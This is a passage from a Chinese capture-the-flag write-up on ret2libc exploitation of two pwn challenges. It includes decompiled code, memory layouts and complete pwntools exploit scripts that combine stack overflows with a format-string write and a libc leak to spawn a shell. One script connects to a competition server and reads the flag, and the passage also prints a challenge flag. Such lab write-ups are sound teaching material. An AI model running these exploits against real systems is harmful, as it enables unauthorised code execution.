print("[+]puts->", hex(puts_leak))

# 阶段3：ret2system
r.recvuntil(b"Send your format beacon:\n")
r.sendline(b"%1$p")
r.recvuntil(b"Send your access packet:\n")

libc.address = puts_leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload_3 = b'a' * offset
payload_3 += p64(canary)
payload_3 += b'b' * 8
payload_3 += p64(ret)          # 栈对齐
payload_3 += p64(pop_rdi_ret)
payload_3 += p64(bin_sh)
payload_3 += p64(system)
r.sendline(payload_3)

r.interactive()
```

![image-20260524152516373](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154551732-1434354838.png)

---

## [御网杯2026]PWN3_Pro

::alert{icon="tabler:files" color="var(--c-accent)" title="附件地址"}

[下载链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/御网杯2026/pwn3)

::

做出了一点点小小的改动，开启了NX保护，那这题就是ret2libc解法啦

---

### 0x01 分析程序

```bash
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
#### main()->0x0401208

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  vuln();
  return 0;
}
```

#### vuln() -> 0x0401196

```python
int vuln()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  puts("=== Message Board ===");
  puts("Leave your message below:");
  printf("Buffer at: %p\n", buf);
  printf("Message: ");
  read(0, buf, 0x100uLL);
  return puts("Thank you for your message!");
}
```

#### 已知条件

vuln函数出现栈溢出，同时没有类似system和/bin/sh的字符串，利用ROPgadget也找不到类似字符，NX开启保护，考虑ret2libc

---

### 0x02 EXP

libc题目思路就是先找出栈溢出点，第一次栈溢出先泄露puts在libc的偏移算出基址，拿到system和/bin/sh存储在libc的地址，返回漏洞函数第二次传输payload

```python
from pwn import *


context(os='linux', arch='amd64')

r = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r.recvuntil(b"Message: ")
offset = 0x80+0x8

payload_1 = b'a'*offset
pop_rdi = 0x4012c3
payload_1 += p64(pop_rdi)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']  

payload_1 += p64(puts_got)
payload_1 += p64(puts_plt)

ret = 0x40125C
payload_1 += p64(ret)*2 #这里就得需要两次垫片，可以先在返回vuln前做一个验证，看看

vuln = 0x0401196
payload_1 += p64(vuln)
r.sendline(payload_1)


r.recvline()
leak = r.recvline().strip()
puts_leak = u64(leak.ljust(8,b'\x00'))
log.info(f"puts leak: {hex(puts_leak)}")

#验证程序
#payload_2 = b"11"
#r.sendline(payload_2)
#可以发现进入第二次函数
#*=== Message Board ===
#Leave your message below:
#就崩掉了

#part2
r.recvuntil(b"Message: ")
libc.address= puts_leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

payload_2 = b'a'*offset
payload_2 += p64(ret)
payload_2 += p64(pop_rdi)
payload_2 += p64(bin_sh)
payload_2 += p64(system)


r.sendline(payload_2)
r.interactive()
```

## [ISCC-2026 练武pwn2]



::alert{type="question"}
[题目链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/ISCC-2026-PWN/iscc/pwn2 - 副本)
::

这个题目挺有意思的，算是一种libc的加强版

### 0x01 程序信息

基础分析，先看看程序的信息是什么

![image-20260529230630168](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085537418-402723785.png)

| Arch     | i386-32-little     |
| -------- | ------------------ |
| RELRO    | Partial RELRO      |
| Stack    | No canary found    |
| NX       | NX enabled         |
| PIE      | No PIE (0x8048000) |
| Stripped | No                 |

可以发现的是程序没有canary保护，同时PIE并没有开启，地址固定

---

### 0x02 分析程序



#### main()

![image-20260529230412881](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085536451-1717111564.png)

```c
char buf[32];
puts("Ready to begin...");
puts("Hope you have a good time here.");
read(0, buf, 32);
printf(buf);                          // [1] format string
if (*(0x0804C030) == 5) vuln();       // [2] need target_val == 5
```

#### vuln()

![image-20260529230455216](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085535641-1417935358.png)

```c
char buf[144];
write(1, "Input:\n", 7);
read(0, buf, 256);                    // [3] stack overflow
```

根据函数结构，出现一个printf的字符串漏洞和vuln函数栈溢出，同时使用

:key{code="F12" ctrl shift}并没有出现/bin/sh和system字符串。使用ROPgadget同理，那这题应该就是ret2libc，通过libc库寻找system和/bin/sh

目前有的思路是通过main()中的``if ( *(_DWORD *)x == 5 )``进入漏洞函数。

``*(_DWORD *)x``实际是`int* x` 实际指向的是target_val

![image-20260529231731501](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085534973-489418740.png)

---

#icon
ヾ(•ω•`)o
#default
先简单发送字符串看看怎么个事情
::

```python
from pwn import *

context(os='linux',arch = 'i386')

r = process("./attachment-9")

payload = b"AAAA,%p,%p,%p,%p,%p,%p,%p"

r.sendline(payload)

r.interactive()

```

![image-20260529234019957](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615085533744-779863317.png)

可以发现在栈第4个地址发现了字符串AAAA，这个地方就是s字符串的开始

### 0x03 攻击思路

```c
Stage 1: 格式化字符串
  ├── %8$n  → target_val = 5 (开门进 vuln)
  └── %9$s  → leak puts@GOT (泄露 libc)

Stage 2: ret2libc
  ├── 144(buf) + 4(ebp) = 148 padding
  └── system + dummy_ret + /bin/sh

Stage 3: getshell → cat /flag*
```

格式化字符串布局（32bytes）

```asm
Offset  Content          Why
──────────────────────────────────────
 0      %5c%8$n         写5到target_val
 8      |AAAAAAA        标记(解析用)
16      p32(0x0804C030)  %8$n指向的地址
20      p32(0x0804C014)  %9$s读取的地址
24      %9$s            泄露puts
28      LEAK            结束标记
```

溢出布局 (4+148 = 152 bytes)

```asm
Offset  Content
──────────────────────────
 0      144 bytes      buf padding
144     4 bytes        saved_ebp
148     system_addr    ret addr
152     0xdeadbeef     system's ret (dummy)
156     binsh_addr     arg1: "/bin/sh"
```

---

### 0x04 libc 版本识别

libc.rip 输入 puts 末三字节 `0x1e0`，匹配到：

```asm
libc6-i386_2.31-0ubuntu9.17
  puts:   0x0006d1e0
  system: 0x00041360
  /bin/sh:0x0018c363
```

---

### 0x05 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

TARGET_VAL = 0x0804c030
PUTS_GOT   = 0x0804c014
PUTS_OFF   = 0x6d1e0
SYSTEM_OFF = 0x41360
BINSH_OFF  = 0x18c363

r = remote('39.96.193.120', 10000)
r.recvuntil(b'here.\n')

# Stage 1: fmt string -> write target_val + leak puts
fmt  = b'%5c%8$n|AAAAAAAA'
fmt += p32(TARGET_VAL)
fmt += p32(PUTS_GOT)
fmt += b'%9$s'
fmt += b'LEAK'

r.send(fmt)
resp = r.recvuntil(b'Input:\n')

aaaa = resp.find(b'AAAAAAAA')
leak_raw = resp[aaaa + 8 + 8:resp.find(b'LEAK')]
puts_addr = u32(leak_raw[:4])
log.success(f'puts = {hex(puts_addr)}')

libc = puts_addr - PUTS_OFF
system_addr = libc + SYSTEM_OFF
binsh_addr = libc + BINSH_OFF

# Stage 2: overflow ret2libc
payload  = b'A' * 148
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)

r.send(payload)

import time
time.sleep(0.5)
r.sendline(b'cat /flag*')
time.sleep(0.5)
print(r.recv(timeout=3).decode('latin-1'))
r.interactive()
```

---

### 0x06 Flag

```
ISCC{e2d72fc8-fd71-4339-a79f-43a23013d374}
```





```md wrap
pwn-ret2libc基础知识点，包含题目
```

